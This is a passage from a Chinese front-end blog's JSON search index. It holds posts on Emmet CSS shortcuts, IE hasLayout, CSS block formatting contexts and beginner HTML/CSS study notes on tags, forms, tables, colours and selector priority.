&lt;dd&gt;&lt;/dd&gt;&lt;/dl&gt;` table+ 12345&lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; tr+ 123&lt;tr&gt; &lt;td&gt;&lt;/td&gt;&lt;/tr&gt; select+ 123&lt;select name=\"\" id=\"\"&gt; &lt;option value=\"\"&gt;&lt;/option&gt;&lt;/select&gt; c 1&lt;!-- --&gt; cc:ie6 123&lt;!--[if lte IE 6]&gt; $&#123;child&#125;&lt;![endif]--&gt; CSSvisual formating pos:s 1position:static; pos:a 1position:absolute; pos:r 1position:relative; pos:f 1position:fixed; t 1top:; b:a 1bottom:auto; l 1left:; l:a 1left:auto; z 1z-index:; z:a 1z-index:auto; fl 1float:left; fl:n 1float:none; fl:l 1float:left; fl:r 1float:right; cl 1clear:both; cl:n 1clear:none; cl:l 1clear:left; cl:r 1clear:right; cl:b 1clear:both; d 1display:block; d:n 1display:none; d:b 1display:block; d:i 1display:inline; d:ib 1display:inline-block; d:itb 1display:inline-table; d:tbc 1display:table-cell; v 1visibility:hidden; v:v 1visibility:visible; v:h 1visibility:hidden; ov 1overflow:hidden; ov:v 1overflow:visible; ov:h 1overflow:hidden; ov:s 1overflow:scroll; zoo, zm 1zoom:1; cur:d 1cursor:default; cur:ha 1cursor:hand; cur:p 1cursor:pointer; Margin &amp; Padding m:a 1margin:auto; mt 1margin-top:; mt:a 1margin-top:auto; mr 1margin-right:; mr:a 1margin-right:auto; mb 1margin-bottom:; mb:a 1margin-bottom:auto; ml 1margin-left:; ml:a 1margin-left:auto; pt 1padding-top:; pr 1padding-right:; pb 1padding-bottom:; pl 1padding-left:; Font fw 1font-weight:; fw:n 1font-weight:normal; fw:b 1font-weight:bold; fw:br 1font-weight:bolder; fw:lr 1font-weight:lighter; fs 1font-style:$&#123;italic&#125;; fs:n 1font-style:normal; fz 1font-size:; ff 1font-family:; ff:s 1font-family:serif; ff:ss 1font-family:sans-serif; ff:m 1font-family:monospace; ff:a 1font-family: Arial, \"Helvetica Neue\", Helvetica, sans-serif; ff:t 1font-family: \"Times New Roman\", Times, Baskerville, Georgia, serif; ff:v 1font-family: Verdana, Geneva, sans-serif; Background bg 1background:#000; bg+ 1background:#fff url() 0 0 no-repeat; bg:n 1background:none; bgc 1background-color:#fff; bgc:t 1background-color:transparent; bgi 1background-image:url(); bgi:n 1background-image:none; bgr 1background-repeat:; bgr:n 1background-repeat:no-repeat; bgr:x 1background-repeat:repeat-x; bgr:y 1background-repeat:repeat-y; bgr:sp 1background-repeat:space; bgr:rd 1background-repeat:round; bga 1background-attachment:; bga:f 1background-attachment:fixed; bga:s 1background-attachment:scroll; bgp 1background-position:0 0; bgpx 1background-position-x:; bgpy 1background-position-y:; bgbk 1background-break:; bgbk:bb 1background-break:bounding-box; bgbk:eb 1background-break:each-box; bgbk:c 1background-break:continuous; bgcp 1background-clip:padding-box; bgcp:bb 1background-clip:border-box; bgcp:pb 1background-clip:padding-box; bgcp:cb 1background-clip:content-box; bgcp:nc 1background-clip:no-clip; bgo 1background-origin:; bgo:pb 1background-origin:padding-box; bgo:bb 1background-origin:border-box; bgo:cb 1background-origin:content-box; bgsz 1background-size:; bgsz:a 1background-size:auto; bgsz:ct 1background-size:contain; bgsz:cv 1background-size:cover; Color c 1color:#000; c:r 1color:rgb(0, 0, 0); c:ra 1color:rgba(0, 0, 0, .5); op 1opacity:; 其他 ·@m·, @media· 123@media screen &#123; &#125; @i, @import 1@import url(); @kf 1234@keyframes identifier &#123; from &#123; &#125; to &#123; &#125;&#125; @f+ 12345678910@font-face &#123; font-family: 'FontName'; src: url('FileName.eot'); src: url('FileName.eot?#iefix') format('embedded-opentype'), url('FileName.woff') format('woff'), url('FileName.ttf') format('truetype'), url('FileName.svg#FontName') format('svg'); font-style: normal; font-weight: normal;&#125; @f 1234font-face &#123; font-family:; src:url(|);&#125; ! 1!important","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"Emmet","slug":"Emmet","permalink":"https://ru23.com/tags/Emmet/"}]},{"title":"hasLayout知多少","slug":"2016-09-hasLayout知多少","date":"2016-09-07T11:20:08.000Z","updated":"2018-10-24T03:46:01.922Z","comments":true,"path":"note/7c93cb07.html","link":"","permalink":"https://ru23.com/note/7c93cb07.html","excerpt":"什么是haslayout 什么是hasLayout？hasLayout是IE特有的一个属性。很多的ie下的css bug都与其息息相关。在ie中，一个元素要么自己对自身的内容进行计算大小和组织，要么依赖于父元素来计算尺寸和组织内容。当一个元素的hasLayout属性值为true时，它负责对自己和可能的子孙元素进行尺寸计算和定位。虽然这意味着这个元素需要花更多的代价来维护自身和里面的内容，而不是依赖于祖先元素来完成这些工作","text":"什么是haslayout 什么是hasLayout？hasLayout是IE特有的一个属性。很多的ie下的css bug都与其息息相关。在ie中，一个元素要么自己对自身的内容进行计算大小和组织，要么依赖于父元素来计算尺寸和组织内容。当一个元素的hasLayout属性值为true时，它负责对自己和可能的子孙元素进行尺寸计算和定位。虽然这意味着这个元素需要花更多的代价来维护自身和里面的内容，而不是依赖于祖先元素来完成这些工作 默认拥有haslayout属性 &lt;html&gt;, &lt;body&gt; &lt;table&gt;, &lt;tr&gt;, &lt;th&gt;,&lt;td&gt; &lt;img&gt; &lt;hr&gt; &lt;input&gt;, &lt;button&gt;, &lt;select&gt;, &lt;textarea&gt;, &lt;fieldset&gt;, &lt;legend&gt; &lt;iframe&gt;, &lt;embed&gt;, &lt;object&gt;, &lt;applet&gt; &lt;marquee&gt; 触发haslayout属性 很多情况下，我们把hasLayout的状态改成true就可以解决很大部分ie下显示的bug。hasLayout属性不能直接设定，你只能通过设定一些特定的css属性来触发并改变 hasLayout状态。下面列出可以触发hasLayout的一些CSS属性值 display 启动haslayout的值:inline-block 取消hasLayout的值:其他值 width / height 启动hasLayout的值：除了auto以外的值 取消hasLayout的值：auto ( 对 IE6及更早版本来说很常用，该方法被称为霍莉破解(Holly hack)，即设定这个元素的高度为 1% (height:1%;)。但是要注意，当这个元素的 overflow 属性被设置为 visible 时，这个方法就失效了。) position 启动hasLayout的值：absolute 取消hasLayout的值：static float 启动hasLayout的值：left或right 取消hasLayout的值：none zoom 启动hasLayout的值：有值 取消hasLayout的值：narmal或者空值 (又一个ie私有属性，不兼容标准。) ie7还有一些额外的属性可以触发该属性（不完全列表）： min-height: (任何值) max-height:(任何值除了none) min-width:(任何值) max-width: (任何值除了none) overflow:(任何值除了visible) overflow-x: (任何值除了visible) overflow-y: (任何值除了visible) position: fixed 发现及使用 因元素hasLayout而导致的问题其实一般都很容易发现：往往是内容出现错位甚至完全不可见，比如含浮动或者绝对定位子元素的容器高度会塌陷，在ie6/ie7下我们为其添加zoom：1属性就触发了haslayout，从而修复高度塌陷的问题;再比如，我们经常会碰到ie6和ie7同时出现的bug，这个时候可以考虑是否源于 haslayout，可以添加一些可以触发haslayout的属性来解决","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"CSS中的BFC","slug":"2016-09-CSS中的BFC","date":"2016-09-07T10:20:08.000Z","updated":"2018-10-24T03:46:01.913Z","comments":true,"path":"note/3c61eba.html","link":"","permalink":"https://ru23.com/note/3c61eba.html","excerpt":"BFC 是什么？ BFC (Block Formatting Contexts) 即块级格式化上下文，从样式上看，它与普通的容器没有什么区别，但是从功能上，BFC 可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性，例如可以包含浮动元素，使到它可以包含浮动元素，从而防止出现高度塌陷的问题","text":"BFC 是什么？ BFC (Block Formatting Contexts) 即块级格式化上下文，从样式上看，它与普通的容器没有什么区别，但是从功能上，BFC 可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性，例如可以包含浮动元素，使到它可以包含浮动元素，从而防止出现高度塌陷的问题 如何触发 BFC 触发 BFC 的条件 浮动元素，float 除 none 以外的值 绝对定位元素，position（absolute，fixed） display 为以下其中之一的值 inline-blocks，table-cells，table-captions overflow 除了 visible 以外的值（hidden，auto，scroll） 在 CSS3 中，BFC 叫做Flow Root，并增加了一些触发条件： display 的 table-caption 值 position 的 fixed 值，其实 fixed 是 absolute 的一个子类，因此在 CSS2.1 中使用这个值也会触发 BFC ，只是在CSS3 中更加明确了这一点 BFC布局规则 内部的Box会在垂直方向，一个接一个地放置。 Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠 每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如 此。 BFC的区域不会与float box重叠。 BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。 计算BFC的高度时，浮动元素也参与计算 BFC的作用及原理 自适应两栏布局 1234567891011121314body &#123; width: 300px; position: relative; &#125; .aside &#123; width: 100px; height: 150px; float: left; background: #f66; &#125; .main &#123; height: 200px; background: #fcc; &#125; 1234 &lt;body&gt; &lt;div class=\"aside\"&gt;&lt;/div&gt; &lt;div class=\"main\"&gt;&lt;/div&gt;&lt;/body&gt; 根据BFC布局规则第3条： 每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。 因此，虽然存在浮动的元素aslide，但main的左边依然会与包含块的左边相接触 根据BFC布局规则第四条： BFC的区域不会与float box重叠 我们可以通过通过触发main生成BFC， 来实现自适应两栏布局 123.main &#123; overflow: hidden;&#125; 当触发main生成BFC后，这个新的BFC不会与浮动的aside重叠。因此会根据包含块的宽度，和aside的宽度，自动变窄。效果如下： 清除内部浮动 1234567891011.par &#123; border: 5px solid #fcc; width: 300px; &#125;.child &#123; border: 5px solid #f66; width: 100px; height: 100px; float: left;&#125; 123456&lt;body&gt; &lt;div class=\"par\"&gt; &lt;div class=\"child\"&gt;&lt;/div&gt; &lt;div class=\"child\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt; 根据BFC布局规则第六条： 计算BFC的高度时，浮动元素也参与计算 为达到清除内部浮动，我们可以触发par生成BFC，那么par在计算高度时，par内部的浮动元素child也会参与计算 123.par &#123; overflow: hidden;&#125; 防止垂直 margin 重叠 12345678p &#123; color: #f55; background: #fcc; width: 200px; line-height: 100px; text-align: center; margin: 100px;&#125; 12&lt;p&gt;Haha&lt;/p&gt;&lt;p&gt;Hehe&lt;/p&gt; 两个p之间的距离为100px，发送了margin重叠 根据BFC布局规则第二条： Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠 我们可以在p外面包裹一层容器，并触发该容器生成一个BFC。那么两个P便不属于同一个BFC，就不会发生margin重叠了 1234567891011.wrap &#123; overflow: hidden;&#125;p &#123; color: #f55; background: #fcc; width: 200px; line-height: 100px; text-align: center; margin: 100px;&#125; 1234&lt;p&gt;Haha&lt;/p&gt;&lt;div class=\"wrap\"&gt; &lt;p&gt;Hehe&lt;/p&gt;&lt;/div&gt; 总结 其实以上的几个例子都体现了BFC布局规则第五条 BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此 因为BFC内部的元素和外部的元素绝对不会互相影响，因此， 当BFC外部存在浮动时，它不应该影响BFC内部Box的布局，BFC会通过变窄，而不与浮动有重叠。同样的，当BFC内部有浮动时，为了不影响外部元素的布局，BFC计算高度时会包括浮动的高度。避免margin重叠也是这样的一个道理","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"DIV+CSS系统学习笔记回顾","slug":"2016-09-DIV-CSS系统学习笔记回顾","date":"2016-09-06T10:24:08.000Z","updated":"2018-10-24T03:46:01.915Z","comments":true,"path":"note/96b1bc20.html","link":"","permalink":"https://ru23.com/note/96b1bc20.html","excerpt":"第一部分 HTML 第一章 职业规划和前景 职业方向规划定位： web前端开发工程师 web网站架构师 自己创业 转岗管理或其他","text":"第一部分 HTML 第一章 职业规划和前景 职业方向规划定位： web前端开发工程师 web网站架构师 自己创业 转岗管理或其他 web前端开发的前景展望： 未来IT行业企业需求最多的人才 结合最新的html5抢占移动端的市场 自己创业做老板 随着互联网的普及web开发成为企业的宠儿和核心 web职业发展目标： 第一、梳理知识架构 负责内容的HTML 负责外观的css（层叠样式表） 负责行为的js ps切图 第二、分解目标（起步阶段、提升阶段、成型阶段） 起步阶段： 基本知识的掌握 常用工具的掌握 沟通技巧的掌握（围绕客户的需求） 良好的开发习惯（加注释、对齐方式） 提升阶段： 熟悉掌握HTML基本标签和属性 熟练掌握css的基本语法和使用 浏览器兼容和w3c标准的掌握 结合html+css+js开始系统项目的开发 成型阶段： 精通DIV+CCS布局 精通css样式表控制html标签 熟悉运用js制作动态网站的效果 能独立开发完成网站 第二章 html基本结构 认识HTML： html不是一种编程语言，是一种标志语言 标记语言是由一套标识标签组成的 html使用标签来描述网页 html结构： 1234&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt;&lt;/body&gt;&lt;/html&gt; 不成对出现的标签&lt;br&gt; &lt;hr&gt; &lt;meta&gt; &lt;img&gt; &lt;input..&gt; &lt;option..&gt; &lt;link&gt; HTML 基本标签的讲解： &lt;html&gt; &lt;head&gt; &lt;body&gt;标签 &lt;h1&gt;—-&lt;h6&gt;仅仅用于标题文本，不要为了产生粗体文本使用它们 &lt;p&gt;标签 段落标签 &lt;strong&gt;&lt;b&gt;标签 都会让文字产生加粗效果 &lt;strong&gt;用于强调文本，强度更深，表示重要文本—&gt;用于SEO优化 &lt;b&gt;只是视觉加粗效果—&gt;单纯为了产生加粗 &lt;em&gt; &lt;i&gt;标签 em用于强调文本 i只是视觉斜体效果 &lt;strong&gt;比&lt;em&gt;强调更强 特殊符号： &amp;nbsp; —-&gt;空格 &amp;gt; —&gt;大于号 &amp;lt；—&gt;小于号 &amp;quot；—&gt;引号 &amp;copy;–&gt;版权号 第三章 html基本标签 HTMl基本标签： span标签 对被用来组合文档中的行内元素 注意：span没有固定的格式表现，当对它应用样式时，才会产生视觉上的变化 &lt;pre&gt;标签 文字的格式按源码的排版来显示，我们称之为预处理格式 &lt;a&gt;标签—&gt;他有一个必不可少的属性 href target属性： _self(在原来页面打开) _blank（新窗口打开） _top（打开时忽略所有的框架） _parent（在父窗口中打开） 创建锚点和锚链接 锚点也是一种超链接，是页面内进行跳转的超链接 第一步：创建锚点 &lt;a name=&quot;锚点名称&quot;&gt;&lt;/a&gt; 第二步：使用创建好的锚点名称 &lt;a href=&quot;#锚点名称&quot;&gt;内容&lt;/a&gt; marquee标签 可以创建一个内容滚动效果 1&lt;marquee direction=&quot;down&quot; loop=&quot;4&quot; onmouseover=this.stop() onmouseout=this.start()&gt;&lt;/marquee&gt; direction 表示滚动方向，取值有（left,right,up,down,默认left） loop表示滚动循环的次数，默认为无限循环 1onmouseover=this.stop() onmouseover=this.start() scrollamout=&quot;1&quot;(滚动速度) 表示当鼠标移上区域的时候停止滚动，鼠标移开继续滚动 第四章 img图片标签与路径 图片标签与路径： 常见图片格式 jpg png gif Gif （只支持全透明） Jpeg /jpg Png 半/全透明都支持 图片标签写法 ： &lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; /&gt; 图片四要素： src=&quot;&quot; 图片路径 alt=&quot;&quot; 图片含义 width=&quot;&quot; 图片宽度 和图片大小保持一致 height=&quot;&quot; 图片高度 和图片大小保持一致 title=&quot;&quot; 路径知识： 相对路径、绝对路径： 相对路径：(Relative Path) 相对于该文件的路径； 绝对路径：(Absolute Path) 从磁盘出发的路径； &lt;img src=&quot;&quot; …… align=&quot;&quot; /&gt; align属性–设置图片与后面文字的位置关系值–top、bottom、middle、absmiddle、left、right 在静态页面中： /开头表示根目录； ./表示当前目录；（斜画线前面一个点） ../上级目录；（斜画线前面两个点） 直接用文件名不带/也表示同一目录 这些都是相对于当前文件的位置来说的，如果用绝对路径的话就是写全了。 第五章 三种列表的讲解 三种列表的知识讲解： &lt;ul&gt;无序列表 无序列表是一个没有顺序项目的列表，此列表项默认粗体圆点进行标识 12345&lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt;&lt;/ul&gt; 有序列表 有序列表也是一列项目，只是列表项目使用的是数字进行标记。 有序列表始于 &lt;ol&gt; 标签。每个列表项始于 &lt;li&gt;标签。 12345&lt;ol&gt; &lt;li&gt;内容一&lt;/li&gt; &lt;li&gt;内容二&lt;/li&gt; &lt;li&gt;内容三&lt;/li&gt;&lt;/ol&gt; 列表符号 无序列表-列表符号: type=&quot;circle&quot; 空心圆 type=“disc” 实心圆 默认值 type=&quot;square&quot; 方块符 有序列表-列表符号 type=&quot;A&quot; A B C D type=&quot;a&quot; a b c d type=&quot;1&quot; 1 2 3 4 默认值type=”I” I II III type=”i” i ii iii 列表嵌套 无序列表-嵌套 123456789&lt;ul&gt; &lt;li&gt;柚子 &lt;ul&gt; &lt;li&gt;沙田柚&lt;/li&gt; &lt;li&gt;蜜柚&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;荔枝&lt;/li&gt; &lt;li&gt;苹果&lt;/li&gt;&lt;/ul&gt; 有序列表-嵌套 123456789&lt;ol&gt; &lt;li&gt;茶 &lt;ul&gt; &lt;li&gt;红茶&lt;/li&gt; &lt;li&gt;绿茶&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;果汁&lt;/li&gt; &lt;li&gt;牛奶&lt;/li&gt;&lt;/ol&gt; 定义列表 定义列表不仅仅是一列项目，而是项目及其注释的组合。定义列表以 &lt;dl&gt; 标签开始。每个定义列表项以 &lt;dt&gt;开始。每个自定义列表项的定义以 &lt;dd&gt; 开始。 123456&lt;dl&gt; &lt;dt&gt;pc网页制作&lt;/dt&gt; &lt;dd&gt;学习DIV+CSS JS JQ 项目实战&lt;/dd&gt; &lt;dt&gt;手机网页制作&lt;/dt&gt; &lt;dd&gt;手机网页制作实战&lt;/dd&gt;&lt;/dl&gt; dd是对dt的解释 &lt; dl&gt;&lt; /dl&gt;用来创建一个普通的列表, &lt; dt&gt;&lt; /dt&gt;用来创建列表中的上层项目， &lt; dd&gt;&lt; /dd&gt;用来创建列表中最下层项目， &lt; dt&gt;&lt; /dt&gt;和&lt; dd&gt;&lt; /dd&gt;都必须放在&lt; dl&gt;&lt; /dl&gt;标志对之间。 12345678910&lt;dl&gt; &lt;dt&gt;中国城市&lt;/dt&gt; &lt;dd&gt;北京 &lt;/dd&gt; &lt;dd&gt;上海 &lt;/dd&gt; &lt;dd&gt;广州 &lt;/dd&gt; &lt;dt&gt;美国城市&lt;/dt&gt; &lt;dd&gt;华盛顿 &lt;/dd&gt; &lt;dd&gt;芝加哥 &lt;/dd&gt; &lt;dd&gt;纽约 &lt;/dd&gt;&lt;/dl&gt; dl是definition list的缩写 dt是definition title的缩写 dd是definition description的缩写 list-style属性具有三个属性分量： list-style-position ：设置列表项图标的位置，位于文本内或者文本外 list-style-type： 设置列表项图标的类型 list-style-image：使用图像设置列表项图标 第六章 表单元素(上) 表单标签: &lt;form&gt;表单标签 &lt;form&gt;表单是一个包含表单元素的区域，包括起来的都是表单的内容123&lt;form&gt; &lt;input type=&quot;text&quot;/&gt;&lt;/form&gt; HTML标签 - Action和确认按钮： 当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。 1234&lt;form action=&quot;html.do&quot; method=&quot;get&quot;&gt; username: &lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提 交&quot; /&gt;&lt;/form&gt; HTML标签 - 隐藏域隐藏标签： 隐藏域在页面中对于用户是不可见的，在表单中插入隐藏域的目的在于收集或发送信息，以利于被处理表单的程序所使用。浏览者单击发送按钮发送表单的时候，隐藏域的信息也被一起发送到服务器 123&lt;form&gt; &lt;input type=&quot;hidden&quot; name=&quot;hid&quot; value=&quot;value&quot;&gt;&lt;/form&gt; &lt;input&gt;标签的掌握 常用type类型： &lt;input type=&quot;&quot; name=&quot;&quot; value=&quot;&quot; /&gt; type=&quot;text&quot; 单行文本输入框 type=&quot;password&quot; 密码（maxlength=&quot;&quot;） type=&quot;radio&quot; 单项选择（checked=&quot;checked&quot;） type=&quot;checkbox&quot; 多项选择 type=&quot;button&quot; 按钮 type=&quot;submit&quot; 提交 type=&quot;image&quot;图片提交 type=&quot;file&quot; 上传文件 type=&quot;reset&quot;重置 type=&quot;hidden&quot; 隐藏 关于表单中的设置默认值： 123&lt;input type=&quot;text&quot; name=&quot;&quot; value=&quot;今天心情不错&quot; /&gt;&lt;input type=&quot;radio&quot; name=&quot;&quot; value=&quot;&quot; checked=&quot;checked&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot; checked=&quot;checked&quot;&gt; 1234&lt;select name=&quot;&quot; &gt; &lt;option value=&quot;&quot;&gt;&lt;/option&gt; &lt;option value=&quot;&quot; selected=&quot;selected&quot;&gt;&lt;/option&gt;&lt;select&gt; textarea没有默认值 &lt;label&gt;标签的使用 &lt;label&gt;&lt;/label&gt; label 元素不会向用户呈现任何特殊效果。 不过，它为鼠标用户改进了可用性。 如果您在 label 元素内点击文本，就会触发此控件。 就是说，当用户选择该标签时，浏览器就会自动将焦点转到和标签相关的表单控件上。 &lt;label&gt; 标签的for 属性应当与相关元素的 id属性相同。 例子：（重要—注册表单–用户体验–必做） 123&lt;p&gt;单向选择&lt;/p&gt;&lt;label for=&quot;male&quot;&gt;男：&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; id=&quot;male&quot;/&gt;&lt;label for=&quot;nv&quot;&gt;女：&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot;checked=&quot;check&quot;/&gt; 第七章 表单和表格(下) 表单和表格标签： &lt;textarea&gt;文本域标签 &lt;textarea&gt;标签： &lt;textarea&gt;&lt;/textarea&gt;是文本域标签，可以在其中插入一段文字内容，它有两个常用属性rows和cols 注意： rows表示这个文本域有多少行 cols表示这个文本域有多少列 除了这两个属性它还有readonly（只读，文本域的内容无法改变，相当于协议）和title（鼠标放上提示） &lt;select&gt;标签的掌握 注：当提交表单时，浏览器会提交选定的项目，或者收集用逗号分隔的多个选项，将其合成一个单独的参数列表，并且在将 &lt;select&gt; 表单数据提交给服务器时包括 name属性123456&lt;form&gt; &lt;select name=&quot;&quot; id=&quot;&quot;&gt; &lt;option value=&quot;1&quot;&gt;1月&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2月&lt;/option&gt; &lt;/select&gt;&lt;/form&gt; 常用到的属性：disabled=“disabled” name=&quot;sel&quot; size=&quot;2&quot; &lt;table&gt;表格标签 &lt;table&gt;表格标签：&lt;table&gt;是表格标签，可以用它定义一个表格。 123456&lt;table border=&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;姓名&lt;/td&gt; &lt;td&gt;性别&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 注意：&lt;table&gt;的border属性不能少 &lt;tr&gt; &lt;td&gt;标签的使用 &lt;tr&gt;行标签： &lt;tr&gt;可以定义表格中的一行，一个&lt;tr&gt;&lt;/tr&gt;表示一行。 1234567891011&lt;table border=&quot;1&quot;&gt;&lt;tr&gt; &lt;td&gt;姓名&lt;/td&gt; &lt;td&gt;性别&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt; &lt;td&gt;姓名&lt;/td&gt; &lt;td&gt;性别&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; &lt;td&gt;单元格标签: &lt;td&gt;可以定义表格中的一个单元格，&lt;td&gt;&lt;/td&gt;表示一个单元格。1234567&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td &gt;姓名&lt;/td&gt;&lt;td&gt;性别&lt;/td&gt;&lt;td&gt;爱好&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; border-collapse 属性设置是否将表格边框折叠为单一边框： border-collapse:collapse; colspan左右合并 rowspan上下合并 第一部分总结： 非可视化标签：head meta style scrpit... 可视化标签：img div span a ul li… 只有可视化标签，才能用css改变它 单标签：meta link base img input br hr 双标签：html head body div a p span ..ul li ol dl …. 常用可视化标签 div 一般用它来布局 a 超链接标签 href*属性：设置跳转的网页地址 target属性：设置跳转的目标 结论：凡事页面可以点击跳转或者表单提交的文字，都用a标签 img src*属性用来设置图片的url数据 alt提供给搜索引擎搜索的 width height 结论 ：显示图片 ul li 列表 结论：只要将来设计页面中有固定样式的列表，就用ul和li table caption tr td (th) 慢慢已经被淘汰了 被ul li代替 如果是合并竖排的就是合并行（rowspan） 如果是合并横排的就是合并列（colspan） HTML部分导图总结 HTML5标签集合 第二部分 CSS 第八章 css基础知识 css基础知识： css样式表的定义 css：（Cascading Style Sheets）层叠样式表； 分类及位置：内部样式-head区域style标签里面 外部样式-link调用 内联样式-标签元素里面 css内的注释：/*注释内容*/ css样式表的语法 CSS规则由两个主要的部分构成：要添加样式的盒子名或者标签名、和要添加的样式。 盒子名或者标签名{属性:值;} CSS中几种颜色的表示方法 用颜色名表示 有17个预先确定的颜色，它们是 aqua, black, blue, fuchsia, gray, green, lime, maroon, navy, olive, orange, purple, red, silver, teal, white, and yellow 用十六进制的颜色值表示(红、绿、蓝) #FF0000或者#F00 用rgb(r,g,b)函数表示 如：rgb(255,255,0) 用hsl(Hue,Saturation,Lightness)函数表示（色调、饱和度、亮度) 如：hsl(120,100%,100%),色调0代表红色，120代表绿色，240代表蓝色 用rgba(r,g,b,a)函数表示 其中a表示的是改颜色的透明度，取值范围是0~1，其中0代表完全透明 用hsla(Hue,Saturation,Lightness,alpha)函数表示 色调、饱和度、亮度、透明度 例子 123456789 &lt;div style=\"position:absolute;top:0px\"&gt; &lt;div style=\"background-color:gray;\"&gt;background-color:gray&lt;/div&gt; &lt;div style=\"background-color:#F00;\"&gt;background-color:#F00&lt;/div&gt; &lt;div style=\"background-color:#ffff00;\"&gt;background-color:#ffff00&lt;/div&gt; &lt;div style=\"background-color:rgb(255,0,255);\"&gt;background-color:rgb(255,0,255)&lt;/div&gt; &lt;div style=\"background-color:hsl(120,80%,50%);\"&gt;background-color:hsl(120,80%,50%)&lt;/div&gt; &lt;div style=\"background-color:rgba(255,0,255,0.5);\"&gt;background-color:rgba(255,0,255,0.5)&lt;/div&gt; &lt;div style=\"background-color:hsla(120,80%,50%,0.5);\"&gt;background-color:hsla(120,80%,50%,0.5)&lt;/div&gt;&lt;/div&gt; 内部样式表 当单个页面需要设置样式时，就应该使用内部样式表。 使用 &lt;style&gt;&lt;/style&gt;标签在文档&lt;head&gt;&lt;/head&gt;里面定义内部样式表 12345&lt;head&gt; &lt;style type=&quot;text/css&quot; &gt; p&#123;color:red;&#125; &lt;/style&gt;&lt;/head&gt; 从外部引入到样式分为两种：（注意写在head标签里面） 当样式需要应用于很多页面时，就需要用到外部样式表，首先需要创建一个css文件，然后引用到我们的页面中。 Link样式表式： &lt;link rel=”stylesheet” type=”text/css” href=”my.css”(href表示路径)&gt; Html式： &lt;style type=&quot;text/css&quot;&gt;@import url(&quot;css.css&quot;);&gt;&lt;/style&gt; 内联样式表（优先级高） 写在标签里面的样式 如：&lt;p style=&quot;color:red;&quot;&gt;&lt;/p&gt; 表示给p标签里面的文字颜色设置为红色 区别：外链样式与导入样式 link标签是属于xhtml范畴，而@import则是css2.1中特有的。link标签除了可以加载CSS外，还可以做很多其它的事情，比如定义RSS，定义rel连接属性等，@import就只能加载CSS了。 加载的顺序的区别，link加载的css时，是一种并行(没有尝试是否是这样)加载CSS方式，而@impor则在整个页面加载完成后才加载。 兼容性的区别，因@import`CSS2.1才特有的，所以对于不兼容CSS2.1`的浏览器来说，无效。 在样式控制上(比如动态改变网页的布局时,使用javascript操作DOM)的区别，此时@import就无能为力了。 样式的优先级补充 相同权值情况下，CSS样式的优先级总结来说，就是——就近原则（离被设置元素越近优先级别越高）： 内联样式表（标签内部） &gt; 嵌入样式表（当前文件中）&gt; 外部样式表（外部文件中） 权值不同时，浏览器是根据权值来判断使用哪种css样式的，哪种样式权值高就使用哪种样式 层叠优先级是: 浏览器缺省&lt; 外部样式表 &lt; 内部样式表 &lt; 内联样式 其中样式表又有:类选择器 &lt; 类派生选择器&lt;ID选择器 &lt; ID派生选择器 派生选择器以前叫上下文选择器，所以完整的层叠优先级是: 浏览器缺省 &lt;外部样式表 &lt; 外部样式表类选择器 &lt; 外部样式表类派生选择器&lt; 外部样式表ID选择器 &lt; 外部样式表ID派生选择器&lt; 内部样式表 &lt; 内部样式表类选择器 &lt; 内部样式表类派生选择器 &lt; 内部样式表ID选择器 &lt; 内部样式表ID派生选择器 &lt; 内联样式…共12个优先级 另外，如果同一个元素在没有其他样式的作用影响下，其Class定义了多个并以空格分开，其优先级顺序为： 一个元素同时应用多个class，后定义的优先（即近者优先），加上!important者最优先！ 第九章 css选择器(上) css选择器： class类选择器可以重复利用 id选择器唯一 标签选择器 什么是选择器：css选择器就是要改变样式的对象 选择器{属性:值;属性:值;} 标签选择器：页面中所有的标签都是一个选择器 p{color:red;} ID选择器 选择id命名的元素 以 # 开头 #p1{color:#0f0;} 类选择器 class选择器，选择clas命名的元素 以.开头 .first{color:#00f;} css代码写完后上线前要经过压缩处理 本地和服务器分两个css版本（备份） 压缩后注释都清除，空间体积减少 群组选择器 选择多个元素,以逗号隔开 